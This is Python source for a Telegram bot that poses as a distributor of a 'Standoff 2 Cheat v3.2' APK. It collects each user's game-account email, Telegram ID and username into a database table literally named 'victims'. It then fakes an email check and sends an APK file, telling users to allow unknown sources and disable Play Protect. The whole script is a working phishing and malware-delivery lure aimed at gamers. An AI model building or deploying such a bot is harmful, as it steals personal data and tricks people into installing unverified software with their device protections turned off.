import telebot
from telebot import types
import os, threading, time, sqlite3, datetime, re

TOKEN = os.environ.get("TG_TOKEN")
APK_PATH = "standoff_cheat.apk"

print("=== ENV CHECK ===")
print("TG_TOKEN set:", bool(TOKEN))
print("=================")

DB = "victims.db"
bot = telebot.TeleBot(TOKEN)

user_state = {}
_started = False

def init_db():
    db = sqlite3.connect(DB)
    db.execute("""CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tg_id TEXT, username TEXT, email TEXT, ts TEXT)""")
    db.commit()
    db.close()

def main_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("🎮 Получить чит Standoff 2", callback_data="get_cheat"),
        types.InlineKeyboardButton("📖 Инструкция", callback_data="info"),
        types.InlineKeyboardButton("💬 Поддержка", callback_data="support"),
    )
    return kb

@bot.message_handler(commands=['start'])
def on_start(m):
    text = (
        "🔥 <b>Standoff 2 Cheat v3.2</b>\n\n"
        "Добро пожаловать в официальный бот для выдачи чита.\n\n"
        "📌 <b>Возможности:</b>\n"
        "• Aimbot (автонаведение)\n"
        "• Wallhack (видеть через стены)\n"
        "• ESP (показ врагов)\n"
        "• NoRecoil (без отдачи)\n"
        "• SpeedHack\n\n"
        "⚠️ <b>Для получения APK требуется подтверждение email от аккаунта Standoff 2.</b>\n\n"
        "Нажми кнопку ниже, чтобы начать 👇"
    )
    bot.send_message(m.chat.id, text, parse_mode="HTML", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda c: True)
def on_callback(c):
    bot.answer_callback_query(c.id)

    if c.data == "get_cheat":
        text = (
            "📧 <b>Шаг 1 из 2 — Подтверждение аккаунта</b>\n\n"
            "Для выдачи APK-файла читера необходимо подтвердить, "
            "что у вас есть аккаунт в Standoff 2.\n\n"
            "Введите email, привязанный к вашему аккаунту Standoff 2 👇"
        )
        bot.send_message(c.message.chat.id, text, parse_mode="HTML")
        user_state[c.message.chat.id] = "waiting_email"

    elif c.data == "info":
        bot.send_message(c.message.chat.id,
            "📖 <b>Инструкция:</b>\n\n"
            "1. Нажми «Получить чит»\n"
            "2. Введи email от аккаунта Standoff 2\n"
            "3. Дождись проверки\n"
            "4. Скачай APK\n"
            "5. Установи (разреши установку из неизвестных источников)\n"
            "6. Запусти чит перед входом в игру",
            parse_mode="HTML")

    elif c.data == "support":
        bot.send_message(c.message.chat.id,
            "💬 По вопросам: @your_support_username",
            parse_mode="HTML")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id) == "waiting_email")
def on_email(m):
    text = m.text or ""
    EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
    match = EMAIL_RE.search(text)

    if not match:
        bot.send_message(m.chat.id, "❌ Некорректный email. Попробуйте снова.")
        return

    email = match.group(0)
    username = m.from_user.username or m.from_user.first_name or "?"
    uid = str(m.from_user.id)

    db = sqlite3.connect(DB)
    db.execute("INSERT INTO victims (tg_id,username,email,ts) VALUES (?,?,?,?)",
               (uid, username, email, datetime.datetime.now().isoformat()))
    db.commit()
    db.close()
    print(f"[+] {username}: {email}")

    bot.send_message(m.chat.id, "⏳ <b>Проверяем ваш email в базе Standoff 2...</b>", parse_mode="HTML")
    time.sleep(3)
    bot.send_message(m.chat.id, "⏳ <b>Проверка пройдена. Готовим APK...</b>", parse_mode="HTML")
    time.sleep(2)

    try:
        with open(APK_PATH, "rb") as f:
            bot.send_document(
                m.chat.id, f,
                caption=(
                    "✅ <b>Standoff 2 Cheat v3.2</b>\n\n"
                    "📦 Установите APK и запустите перед входом в игру.\n"
                    "🔑 Активация: автоматическая.\n\n"
                    "⚠️ Не забудьте отключить Play Protect."
                ),
                parse_mode="HTML")
        print(f"[+] APK отправлен {username}")
    except Exception as e:
        bot.send_message(m.chat.id, "❌ Ошибка при отправке APK. Напишите в поддержку.")
        print("[-] apk error:", repr(e))

    user_state.pop(m.chat.id, None)

def run_bot():
    time.sleep(5)
    print("[*] Бот запущен, слушаю сообщения...")
    bot.infinity_polling()

def start_bot_thread():
    global _started
    if _started:
        return
    _started = True
    init_db()
    threading.Thread(target=run_bot, daemon=True).start()
